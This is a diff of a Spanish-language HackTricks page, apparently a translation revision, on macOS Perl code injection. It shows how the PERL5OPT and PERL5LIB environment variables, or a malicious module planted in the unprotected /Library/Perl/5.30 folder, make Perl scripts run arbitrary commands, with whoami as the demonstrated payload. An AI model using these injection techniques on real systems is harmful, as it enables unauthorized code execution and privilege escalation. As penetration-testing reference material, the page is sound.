@@ -10,12 +10,12 @@ Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 * Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
 
-## A través de las variables de entorno `PERL5OPT` y `PERL5LIB`
+## A través de la variable de entorno `PERL5OPT` & `PERL5LIB`
 
 Usando la variable de entorno PERL5OPT es posible hacer que perl ejecute comandos arbitrarios.\
 Por ejemplo, crea este script:
@@ -27,12 +27,12 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Ahora **exporta la variable de entorno** y ejecuta el script **perl**:
+Ahora **exporta la variable de entorno** y ejecuta el script de **perl**:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-Otra opción es crear un módulo Perl (por ejemplo, `/tmp/pmod.pm`):
+Otra opción es crear un módulo de Perl (por ejemplo, `/tmp/pmod.pm`):
 
 {% code title="/tmp/pmod.pm" %}
 ```perl
@@ -43,7 +43,7 @@ system('whoami');
 ```
 {% endcode %}
 
-Y luego usar las variables de entorno:
+Y luego usa las variables de entorno:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
@@ -53,7 +53,7 @@ Es posible listar el orden de la carpeta de dependencias de Perl en ejecución:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-Lo siguiente devolverá algo como:
+Lo que devolverá algo como:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -65,15 +65,15 @@ Lo siguiente devolverá algo como:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Algunas de las carpetas devueltas ni siquiera existen, sin embargo, **`/Library/Perl/5.30`** sí **existe**, no está **protegida** por **SIP** y está **antes** de las carpetas **protegidas por SIP**. Por lo tanto, alguien podría abusar de esa carpeta para agregar dependencias de scripts allí para que un script Perl de alto privilegio las cargue.
+Algunas de las carpetas devueltas ni siquiera existen, sin embargo, **`/Library/Perl/5.30`** **existe**, **no está** **protegida** por **SIP** y está **antes** de las carpetas **protegidas por SIP**. Por lo tanto, alguien podría abusar de esa carpeta para agregar dependencias de script allí para que un script Perl de alto privilegio lo cargue.
 
 {% hint style="warning" %}
-Sin embargo, ten en cuenta que **necesitas ser root para escribir en esa carpeta** y hoy en día obtendrás este **aviso de TCC**:
+Sin embargo, ten en cuenta que **necesitas ser root para escribir en esa carpeta** y hoy en día recibirás este **mensaje de TCC**:
 {% endhint %}
 
 <figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-Por ejemplo, si un script está importando **`use File::Basename;`** sería posible crear `/Library/Perl/5.30/File/Basename.pm` para hacer que ejecute código arbitrario.
+Por ejemplo, si un script está importando **`use File::Basename;`**, sería posible crear `/Library/Perl/5.30/File/Basename.pm` para hacer que ejecute código arbitrario.
 
 ## Referencias
 
@@ -87,9 +87,9 @@ Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 <summary>Apoya a HackTricks</summary>
 
-* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
